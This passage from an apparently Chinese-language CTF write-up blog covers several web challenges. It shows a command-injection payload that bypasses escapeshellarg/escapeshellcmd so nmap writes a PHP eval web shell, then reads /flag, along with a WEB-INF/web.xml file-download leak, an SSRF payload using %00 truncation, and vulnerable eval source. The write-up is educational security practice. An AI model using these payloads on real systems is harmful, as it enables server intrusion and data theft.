&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;highlight_file&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;__FILE__&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;} &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;host&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellarg&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellcmd&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $sandbox &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;md5&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;glzjin&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt; $_SERVER[&lt;span style="color:#e6db74"&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;you are in sandbox &amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$sandbox;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;@&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;mkdir&lt;/span&gt;($sandbox);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;chdir&lt;/span&gt;($sandbox);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数&lt;code&gt;escapeshellarg&lt;/code&gt;、&lt;code&gt;escapeshellcmd&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这道题利用了两个点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;nmap可以将扫描的结果存储在文件里。使用方法：&lt;a class="link" href="https://blog.csdn.net/weixin_34221036/article/details/92148628" target="_blank" rel="noopener"
&gt;Nmap扫描结果的保存和输出&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;escapeshellarg+escapeshellcmd同时使用有一些漏洞&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener"
&gt;谈谈escapeshellarg参数绕过和注入的问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://paper.seebug.org/164/" target="_blank" rel="noopener"
&gt;PHP escapeshellarg()+escapeshellcmd() 之殇&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;参考博客整理一下这两个处理命令的函数同时使用时的问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;假如传入的参数为&lt;code&gt;172.17.0.2' -v -d a=1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;首先经过&lt;code&gt;escapeshellarg&lt;/code&gt;函数，这个函数会把单独的单引号&lt;code&gt;'&lt;/code&gt;加上转义符&lt;code&gt;\&lt;/code&gt;并使用单引号&lt;code&gt;'&lt;/code&gt;括起来，再使用单引号&lt;code&gt;'&lt;/code&gt;把整个参数括起来。这时候的参数是&lt;code&gt;'172.17.0.2'\'' -v -d a=1'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;再进入&lt;code&gt;escapeshellcmd&lt;/code&gt;函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号&lt;code&gt;'&lt;/code&gt;不过处理，转义符&lt;code&gt;\&lt;/code&gt;再使用转义符转义，再略过一个成对的单引号&lt;code&gt;''&lt;/code&gt;，最后一个单引号&lt;code&gt;'&lt;/code&gt;再使用转义符转义。这时候的参数就成了&lt;code&gt;'172.17.0.2'\\'' -v -d a=1\'&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;最后执行的参数是&lt;code&gt;'172.17.0.2'\\'' -v -d a=1\'&lt;/code&gt;，由于中间的&lt;code&gt;\\&lt;/code&gt;被解释为&lt;code&gt;\&lt;/code&gt;而不再是转义字符，所以后面的&lt;code&gt;'&lt;/code&gt;没有被转义，与再后面的&lt;code&gt;'&lt;/code&gt;配对儿成了一个空白符。所以可以简化为&lt;code&gt; 172.17.0.2\ -v -d a=1'&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以构造payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#39;&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php &amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;经过&lt;code&gt;escapeshellarg&lt;/code&gt;函数会被解析成为：&lt;code&gt;''\''&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php '\'''&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;再经过&lt;code&gt;escapeshellcmd&lt;/code&gt;函数会被解析为：&lt;code&gt;''\\''&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php '\\'''&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了&lt;code&gt;1.php\&lt;/code&gt;不在是php文件了。所以我们的payload最终在服务器端是：&lt;code&gt;\&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php \ &lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#39;&amp;lt;?php eval(&lt;/span&gt;&lt;span style="color:#e6db74"&gt;$_POST[_]&lt;/span&gt;&lt;span style="color:#e6db74"&gt;) ?&amp;gt; -oG 1.php &amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellarg&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$host &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;escapeshellcmd&lt;/span&gt;($host);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $host&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;&amp;#39;&amp;lt;?php eval() ?&amp;gt; -oG 1.php &amp;#39;
&amp;#39;&amp;#39;\&amp;#39;&amp;#39;&amp;lt;?php eval() ?&amp;gt; -oG 1.php &amp;#39;\&amp;#39;&amp;#39;&amp;#39;
&amp;#39;&amp;#39;\\&amp;#39;&amp;#39;\&amp;lt;\?php eval\(\) \?\&amp;gt; -oG 1.php &amp;#39;\\&amp;#39;&amp;#39;&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终请求payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?host=&amp;#39;&amp;lt;?php eval($_POST[_]) ?&amp;gt; -oG 1.php &amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行指令时会创建一个sandbox文件夹，访问&lt;code&gt;$sandbox$/1.php&lt;/code&gt;，POST传参&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110615.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;_=system(&amp;#39;cat /flag&amp;#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110726.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="roarctf-2019easy-java"&gt;[RoarCTF 2019]Easy Java
&lt;/h1&gt;&lt;p&gt;是java写的web程序&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;考点是&lt;strong&gt;WEB-INF/web.xml泄露&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WEB-INF主要包含一下文件或目录:&lt;/p&gt;
&lt;p&gt;/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&lt;/p&gt;
&lt;p&gt;/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&lt;/p&gt;
&lt;p&gt;/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&lt;/p&gt;
&lt;p&gt;/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。&lt;/p&gt;
&lt;p&gt;/WEB-INF/database.properties：数据库配置文件&lt;/p&gt;
&lt;p&gt;漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;重点不在登陆界面，而是那个Help按钮，可以下载文件。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310110934.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;首先尝试去读web.xml文档，添加POST请求&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;filename=WEB-INF/web.xml
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以读取web.xml文件：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;web-app&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;xmlns=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://xmlns.jcp.org/xml/ns/javaee&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;xmlns:xsi=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;xsi:schemaLocation=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;version=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;4.0&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;welcome-file-list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;welcome-file&amp;gt;&lt;/span&gt;Index&lt;span style="color:#f92672"&gt;&amp;lt;/welcome-file&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/welcome-file-list&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;IndexController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Index&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;LoginController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Login&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;DownloadController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Download&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.wm.ctf.FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;FlagController&lt;span style="color:#f92672"&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/Flag&lt;span style="color:#f92672"&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;/web-app&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到了一个&lt;code&gt;FlagController&lt;/code&gt;的控制器，它所在的类为&lt;code&gt;com.wm.ctf.FlagController&lt;/code&gt;，前面也提到了编译文件所在的文件夹&lt;code&gt;/WEB-INF/classes/&lt;/code&gt;，去这个文件夹下载&lt;code&gt;FlagController&lt;/code&gt;相关的文件，还需要知道的是：Javaweb程序编译文件的目录结构是根据类名创建的，类名我们也知道了，所以下载：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;class文件源码好多不可见字符&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310112205.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我选中的那段就是flag在的地方，看到了&lt;code&gt;==&lt;/code&gt;就应该意识到是base64编码，但是base64编码里没有&lt;code&gt;&amp;lt;&lt;/code&gt;这个字符，所以flag的密文就是&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;ZmxhZ3s0NmNhMTExMS01ZjI5LTQwYjMtYjUwMC1lYWMzZjkyMjU4ODF9Cg==
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="以下部分施工中"&gt;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;以下部分施工中👷‍♂️&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;
&lt;/h1&gt;&lt;p&gt;下面的都是没有整理，先把重要思路写下来了，然后有时间再配图&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="gkctf2020cve版签到"&gt;[GKCTF2020]cve版签到
&lt;/h1&gt;&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/qq_45521281/article/details/106425266" target="_blank" rel="noopener"
&gt;CVE-2020-7066&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;只有一个按钮，点击以后查看网页的Network请求中有一个&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hint: Flag in localhost&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;且utl地址中有可控的参数，所以应该是使用ssrf。这里还有一个提示是在主页面那里&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You just view *.ctfhub.com&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;只可以访问以ctfhub.com结尾的网站，再根据cve使用%00截断访问：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?url=http://127.0.0.1%00.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第二个提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Host must be end with &amp;lsquo;123&amp;rsquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;必须以123结尾，所以最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?url=http://127.0.0.123%00.ctfhub.com
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="gxyctf2019禁止套娃"&gt;[GXYCTF2019]禁止套娃
&lt;/h1&gt;&lt;p&gt;git泄露。我使用的https://github.com/gakki429/Git_Extract&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#34;flag.php&amp;#34;;
echo &amp;#34;flag在哪里呢？&amp;lt;br&amp;gt;&amp;#34;;
if(isset($_GET[&amp;#39;exp&amp;#39;])){
if (!preg_match(&amp;#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#39;, $_GET[&amp;#39;exp&amp;#39;])) {
if(&amp;#39;;&amp;#39; === preg_replace(&amp;#39;/[a-z,_]+\((?R)?\)/&amp;#39;, NULL, $_GET[&amp;#39;exp&amp;#39;])) {
if (!preg_match(&amp;#39;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#39;, $_GET[&amp;#39;exp&amp;#39;])) {
// echo $_GET[&amp;#39;exp&amp;#39;];
@eval($_GET[&amp;#39;exp&amp;#39;]);
}
else{
die(&amp;#34;还差一点哦！&amp;#34;);
}
}
else{
die(&amp;#34;再好好想想！&amp;#34;);
}
}
else{
